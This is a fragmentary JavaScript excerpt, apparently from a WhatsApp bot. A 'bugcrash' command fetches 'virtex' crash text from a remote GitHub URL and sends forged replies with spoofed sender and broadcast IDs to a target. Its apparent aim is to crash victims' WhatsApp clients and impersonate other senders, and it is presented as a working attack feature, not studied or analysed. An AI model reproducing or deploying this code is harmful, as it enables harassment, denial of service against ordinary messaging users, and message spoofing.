...
let viruswan = await (await fetch("https://raw.githubusercontent.com/WannBotz/virus/main/virtex1.txt")).text()
	...
	switch (type) {
		...
		break
		case 'bugcrash': {
			conn.fakeReply(target, 'A', '12136852040@s.whatsapp.net', 'B', '0@s.whatsapp.net@broadcast')
			conn.fakeReply(target, 'A', '12136852040@s.whatsapp.net', 'B', '0@broadcast')
...
let bcbg = `https://telegra.ph/file/6db207196807bcf1ca1c5.jpg`
